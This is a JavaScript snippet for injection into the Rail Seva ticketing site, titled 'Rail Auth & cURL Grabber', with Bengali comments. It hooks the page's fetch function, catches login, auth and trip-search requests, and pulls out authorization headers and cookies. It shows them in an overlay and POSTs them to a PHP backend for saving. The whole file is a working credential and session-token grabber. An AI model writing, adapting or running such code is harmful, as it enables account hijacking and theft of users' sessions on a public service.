(async function() {
    const existingAvatar = document.getElementById('cybersh-floating-avatar');
    const existingOverlay = document.getElementById('cybersh-logger-overlay');
    
    if (existingAvatar && existingOverlay) {
        existingOverlay.style.display = existingOverlay.style.display === 'none' ? 'flex' : 'none';
        existingAvatar.style.display = existingOverlay.style.display === 'none' ? 'block' : 'none';
        return;
    }

    let capturedAuthData = "No Auth/cURL captured yet. Please login or search on Rail Seva.";

    const styleTag = document.createElement('style');
    styleTag.innerHTML = `
        #cybersh-logger-overlay {
            resize: both;
            overflow-y: auto !important;
            overflow-x: hidden;
            min-width: 320px;
            min-height: 380px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        #cybersh-logger-overlay::-webkit-scrollbar { width: 5px; }
        #cybersh-logger-overlay::-webkit-scrollbar-thumb { background: rgba(56, 189, 248, 0.3); border-radius: 10px; }
    `;
    document.head.appendChild(styleTag);

    const avatarHtml = `<div id="cybersh-floating-avatar" style="position: fixed; bottom: 24px; right: 24px; width: 52px; height: 52px; border-radius: 50%; z-index: 999998; box-shadow: 0 10px 25px rgba(0,0,0,0.7); border: 2px solid #38bdf8; cursor: pointer; background: #0f172a; display: none;"><img src="https://avatars.githubusercontent.com/u/85736436?v=4" style="width: 100%; height: 100%; border-radius: 50%;" /></div>`;

    const overlayHtml = `
    <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 450px; background: rgba(15, 23, 42, 0.98); color: #f8fafc; z-index: 999999; border-radius: 20px; padding: 18px; font-family: sans-serif; font-size: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.75); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.3);">
        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(51, 65, 85, 0.5); padding-bottom: 10px; margin-bottom: 10px;">
            <strong style="color: #38bdf8;">Rail Auth & cURL Grabber</strong>
            <button id="cybersh-btn-minimize" style="background: none; color: #38bdf8; border: 1px solid #38bdf8; border-radius: 4px; cursor: pointer;">_</button>
        </div>
        <div style="font-size: 9px; color: #94a3b8; margin-bottom: 4px;">Captured Auth / cURL:</div>
        <div id="cybersh-log-content" style="flex-grow: 1; min-height: 140px; max-height: 220px; overflow-y: auto; background: #020617; padding: 10px; border-radius: 8px; color: #4ade80; font-family: monospace; font-size: 11px; word-break: break-all; white-space: pre-wrap;">Waiting for login or API request...</div>
        <button id="cybersh-btn-copy" style="margin-top: 10px; background: #0284c7; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; font-weight: bold;">Copy Data</button>
    </div>`;

    const container = document.createElement('div');
    container.innerHTML = overlayHtml + avatarHtml;
    document.body.appendChild(container);

    const overlay = document.getElementById('cybersh-logger-overlay');
    const avatar = document.getElementById('cybersh-floating-avatar');
    const logContent = document.getElementById('cybersh-log-content');
    const copyBtn = document.getElementById('cybersh-btn-copy');

    document.getElementById('cybersh-btn-minimize').onclick = () => { overlay.style.display = 'none'; avatar.style.display = 'block'; };
    avatar.onclick = () => { avatar.style.display = 'none'; overlay.style.display = 'flex'; };

    copyBtn.onclick = () => {
        navigator.clipboard.writeText(capturedAuthData);
        copyBtn.innerText = "Copied!";
        setTimeout(() => copyBtn.innerText = "Copy Data", 2000);
    };

    // ফাংশন যা ডেটা পিএইচপি ব্যাকএন্ডে পাঠাবে (index.php এ সেভ করার জন্য)
    function sendToPhpServer(dataString, type) {
        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `save_auth=true&type=${type}&data=${encodeURIComponent(dataString)}`
        }).catch(err => console.log('PHP sync error:', err));
    }

    // Fetch ইন্টারসেপ্টর (লগইন টোকেন এবং সার্চ রিকোয়েস্ট ধরার জন্য)
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        try {
            const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
            
            // যদি লগইন বা সার্চ সম্পর্কিত রিকোয়েস্ট হয়
            if (url.includes('login') || url.includes('search-trips-v2') || url.includes('auth')) {
                const options = args[1] || {};
                let headerData = "";
                
                if (options.headers) {
                    const headers = options.headers instanceof Headers ? Object.fromEntries(options.headers.entries()) : options.headers;
                    for (let h in headers) {
                        headerData += `${h}: ${headers[h]}\n`;
                        // যদি অথরাইজেশন টোকেন বা কুকি পাওয়া যায়
                        if (h.toLowerCase().includes('authorization') || h.toLowerCase().includes('cookie')) {
                            sendToPhpServer(`${h}: ${headers[h]}`, 'TOKEN');
                        }
                    }
                }

                capturedAuthData = `URL: ${url}\n\nHeaders:\n${headerData}`;
                logContent.innerText = capturedAuthData;
                sendToPhpServer(capturedAuthData, 'FULL_REQUEST');
            }
        } catch (e) {}
        return response;
    };
})();
